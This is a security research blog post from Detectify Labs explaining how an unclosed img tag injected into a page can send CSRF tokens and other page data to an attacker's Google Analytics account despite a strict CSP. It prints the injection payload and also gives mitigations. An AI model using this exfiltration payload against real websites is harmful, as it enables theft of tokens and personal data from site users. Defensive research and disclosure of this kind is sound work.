---
source: detectify
source_url: https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/
title: "Bypassing CSP with Google Analytics - Labs Detectify"
author: "Detectify"
published: 2018-01-19T16:21:55+00:00
description: "CSP can greatly limit the impact of an XSS and this is a writeup on how I bypassed CSP with Google Analytics."
---

[Home](https://labs.detectify.com/)/ [How to](https://labs.detectify.com/category/how-to/)/ [Bypassing CSP with Google Analytics](https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/)

[How to](https://labs.detectify.com/category/how-to/ "How to")

# Bypassing CSP with Google Analytics

**Linus Särud** Jan 19, 2018

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/ "Share on LinkedIn")

**Our security researcher and Detectify Crowdsource hacker Linus Särud explains how he bypassed CSP with Google Analytics.**

## Bypassing CSP with Google Analytics

### SP

CSP stands for Content Security Policy and allows a website developer to control what origins the website is allowed to load resources from. Using CSP makes it possible to determine what locations images can be loaded from, if inline-scripts are allowed, and so forth.

If configured to only allow resources and JavaScript to be loaded from a certain location, CSP can greatly limit the impact of an XSS as the attacker is not able to execute JavaScript or load their own external resources.

## Google Analytics

Google Analytics works by loading a tiny image from their domain. As such, the CSP policy does allow images to load from [www.google-analytics.com](https://www.google-analytics.com/). This is not the only way to configure Google Analytics, but it seems to be the most common one.

Google Analytics can be used to track all kinds of things and one of their features is called _events_. To quote their support page:

_Events are user interactions with content that can be tracked independently from a web page or a screen load. Downloads, mobile ad clicks, gadgets, Flash elements, AJAX embedded elements, and video plays are all examples of actions you might want to track as Events._ [_https://support.google.com/analytics/answer/1033068_](https://support.google.com/analytics/answer/1033068)

Events can be submitted to Google Analytics by loading a URL that includes a URL parameter for the event value. A common use case would be to include this image in emails, so as soon as the email is opened an event request is sent to Google Analytics with the value ‘_opened_‘.

A code snippet of that could look like this:

```
<img src=”https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=opened”>
```

As this image can be used in so many different ways Google does no validation of the URL it is loaded from. Even if the link is connected to abc.com’s Analytics account, it can be published on xyz.com and work just fine.

## The issue

About a year ago Github (with help from Cure53) decided to investigate their own CSP policy. They published all their [findings on their blog](https://githubengineering.com/githubs-post-csp-journey/), and we chose to focus on one of the things brought up there.

If an attacker finds an HTML injection on your website and you allow Google Analytics in the CSP, they are able to inject an image making an event request to Google Analytics similar to what we described earlier.

This becomes a potential issue when you consider what happens if we do not close the image tag.

If a legit request looks like this:

```
<img src=’https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=test’>
```

Imagine if we injected this:

```
<img src=’https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=test
```

(compared to the first code snippet, this lacks the last few characters)

The browser will understand it as a picture, and take everything until the next quote in the code as part of the URL. This will all be sent to the attacker, who can login to their Google Analytics account and see the results.

## Impact

### Tokens or user data

The most common issue occurs if the code sent to attackers includes CSRF tokens, or personal information in general.

To understand the issue better, imagine that we got this awesome service that you need an invite to register for, the code would look like this:

![](https://labsadmin.detectify.com/app/uploads/2018/01/Screen-Shot-2018-01-19-at-17.11.45.png)

Now, the CSP is so strict that the only thing we can do is inject HTML (no JavaScript) but also load images from google-analytics.com. We simply inject a non-closed img-tag to google-analytics.com, so it looks like this:

```

```

We can use the developer tools in Firefox to confirm that the request did indeed include the token.

![](https://labsadmin.detectify.com/app/uploads/2018/01/Screen-Shot-2018-01-19-at-13.05.48-1024x802-1.png)

### Bug Bounties

For those out there doing bug bounties, techniques like these could increase the award as you have proved some real impact and are not getting blocked due to CSP.

With that said, before sending mass reports to everyone, read up whether CSP issues are in scope! Many do not consider CSP bypasses themselves as in scope, while others do. HackerOne has [paid bounty](https://hackerone.com/reports/199779) for this and Github explicitly [invites researcher to break their CSP-policy](https://hackerone.com/github).

## Mitigations

To fix the Google Analytics issue, change from using image requests to instead using XHR requests. After doing this, you can safely remove Google Analytics from the img-src in the CSP policy.

As for the bigger picture, look at every service included in the CSP policy and think what could be done to exploit it. Can information somehow be submitted to it, that can then be read by the hacker? Also, try to limit the amount of third parties included as much as possible.

Chrome has taken additional steps to protect against this by [blocking requests that contain both a newline and typical HTML characters](https://www.chromestatus.com/feature/5735596811091968). However, such protections do not exist in FireFox or Safari so it is still possible to exploit.

## Takeaway

Realising how all the services you use can be abused is hard. The general recommendation is to keep the number of [trusted external parties as low as possible](https://blog.detectify.com/2017/02/02/the-danger-of-third-party-scripts/) and be somewhat strict about it, but even that is not always enough. For example, most would not think twice about adding Google Analytics.

This issue is one of the many security flaws that Detectify checks for, so [run a scan now](https://detectify.com/pricing)! We keep up with all the strange new security tricks so that you can focus on development.

### Join Detectify Crowdsource

Linus reported this issue through Detectify Crowdsource, our ethical hacking platform. If you’re a security researcher and want to join Linus and over 100 other ethical hackers, sign up and become part of the community! Crowdsource hackers receive monetary rewards for their submissions, so what are you waiting for? [Join the Crowdsource community](https://cs.detectify.com/)

### Additional readings

[http://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf](http://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf)

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/ "Share on LinkedIn")

**Linus Särud**

Security Researcher

## Check out more content

External Attack Surface Management (EASM) is the continuous discovery, analysis, and monitoring of an organization’s public facing assets. A substantial part of EASM is the …

January 13, 2023

TL/DR: Web applications have both authentication and authorization as key concepts and if bypassed by an attacker, it can compromise sensitive data. With threats such …

August 05, 2022

TL/DR: It’s becoming increasingly easy to compromise sensitive information for attackers to take advantage of. In this post, Detectify security researcher Alfred Berg wrote about …

June 16, 2022

TL/DR: Web applications can be exploited to gain unauthorized access to sensitive data and web servers. Threats include SQL Injection, Code Injection, XSS, Defacement, and …

May 16, 2022